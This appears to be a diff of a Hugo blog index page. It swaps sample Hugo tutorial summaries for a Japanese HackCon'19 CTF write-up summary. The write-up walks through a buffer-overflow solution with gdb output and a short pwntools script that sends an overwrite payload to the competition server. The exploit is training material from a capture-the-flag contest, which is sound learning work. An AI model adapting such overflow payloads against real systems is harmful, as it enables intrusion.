@@ -74,36 +74,29 @@
 	<article class="post">
 		<header>
 			<h1>
-				<a href="https://kuzushiki.github.io/post/creating-a-new-theme/">Creating a New Theme </a>
+				<a href="https://kuzushiki.github.io/post/hackcon2019/">HackCon&#39;19 write up </a>
 			</h1>
 			<span class="post-meta">
-				Sun, Sep 28, 2014 - Read in 34 Min
+				Fri, Feb 14, 2020 - Read in 2 Min
 			</span>
 		</header>
 		<div class="summary">
-			Introduction This tutorial will show you how to create a simple theme in Hugo. I assume that you are familiar with HTML, the bash command line, and that you are comfortable using Markdown to format content. I&rsquo;ll explain how Hugo uses templates and how you can organize your templates to create a theme. I won&rsquo;t cover using CSS to style your theme.
-We&rsquo;ll start with creating a new site with a very basic template.
-			<a href="https://kuzushiki.github.io/post/creating-a-new-theme/">Read more...</a>
-		</div>
-	</article>
-</div>
-
-	
-		<div class="postBody">
-	<article class="post">
-		<header>
-			<h1>
-				<a href="https://kuzushiki.github.io/post/migrate-from-jekyll/">Migrate to Hugo from Jekyll </a>
-			</h1>
-			<span class="post-meta">
-				Mon, Mar 10, 2014 - Read in 4 Min
-			</span>
-		</header>
-		<div class="summary">
-			Move static content to static Jekyll has a rule that any directory not starting with _ will be copied as-is to the _site output. Hugo keeps all static content under static. You should therefore move it all there. With Jekyll, something that looked like
-▾ &lt;root&gt;/ ▾ images/ logo.png  should become
-▾ &lt;root&gt;/ ▾ static/ ▾ images/ logo.png  Additionally, you&rsquo;ll want any files that should reside at the root (such as CNAME) to be moved to static.
-			<a href="https://kuzushiki.github.io/post/migrate-from-jekyll/">Read more...</a>
+			HackCon&rsquo;19に参加しました！ (team:score_gazer)
+結果は705点で112位でした
+baby b0f (Pwn 100 pt) ポイント  バッファオーバーフロー（以下BOF）  解く プログラムを実行するといきなり入力を求められる
+ 間違った入力をするとTry Againと表示される  デバッガで逆アセンブルしつつ実行
+どうやらこの比較命令が怪しい
+RIP: 0x400760 (&lt;main+153&gt;:	cmp DWORD PTR [rbp-0x4],0xdeadbeef) BOFしてここを一致させることを考える
+以下のコマンドでrsp,rbpを表示
+x/32xw $rsp x/32xw $rbp 以下の行に注目
+0x7fffffffdeb0:	0x4141dfa0	0x000a4141	0x00000000	0xcafebabe 今回はAAAAと入力したが，その入力値が確認できる(Aは0x41に相当)
+さらに，0xcafebabeは[rbp-0x4]であることも分かる
+つまり，0xcafebabeの部分を0xdeadbeefにできれば良い
+ペイロードを作ってサーバに投げるプログラムを作って実行
+from pwn import * import socket con = remote(&#39;68.183.158.95&#39;, 8989) payload = b&#39;A&#39; * 10 payload += b&#39;\xef\xbe\xad\xde&#39; con.sendline(payload) con.interactive() フラグゲット
+補足   実は初めて解いたPwn問だったりする
+  Pwntoolsを使用してます
+			<a href="https://kuzushiki.github.io/post/hackcon2019/">Read more...</a>
 		</div>
 	</article>
 </div>
@@ -128,48 +121,6 @@ We&rsquo;ll start with creating a new site with a very basic template.
 
 	
 		
-	
-		<div class="postBody">
-	<article class="post">
-		<header>
-			<h1>
-				<a href="https://kuzushiki.github.io/post/goisforlovers/">(Hu)go Template Primer </a>
-			</h1>
-			<span class="post-meta">
-				Wed, Apr 2, 2014 - Read in 7 Min
-			</span>
-		</header>
-		<div class="summary">
-			Hugo uses the excellent go html/template library for its template engine. It is an extremely lightweight engine that provides a very small amount of logic. In our experience that it is just the right amount of logic to be able to create a good static website. If you have used other template systems from different languages or frameworks you will find a lot of similarities in go templates.
-This document is a brief primer on using go templates.
-			<a href="https://kuzushiki.github.io/post/goisforlovers/">Read more...</a>
-		</div>
-	</article>
-</div>
-
-	
-		<div class="postBody">
-	<article class="post">
-		<header>
-			<h1>
-				<a href="https://kuzushiki.github.io/post/hugoisforlovers/">Getting Started with Hugo </a>
-			</h1>
-			<span class="post-meta">
-				Wed, Apr 2, 2014 - Read in 2 Min
-			</span>
-		</header>
-		<div class="summary">
-			Step 1. Install Hugo Goto hugo releases and download the appropriate version for your os and architecture.
-Save it somewhere specific as we will be using it in the next step.
-More complete instructions are available at installing hugo
-Step 2. Build the Docs Hugo has its own example site which happens to also be the documentation site you are reading right now.
-Follow the following steps:
- Clone the hugo repository Go into the repo Run hugo in server mode and build the docs Open your browser to http://localhost:1313  Corresponding pseudo commands:
-			<a href="https://kuzushiki.github.io/post/hugoisforlovers/">Read more...</a>
-		</div>
-	</article>
-</div>
-
 	
 		<div class="links">
 			<a href="https://kuzushiki.github.io/">Home</a>
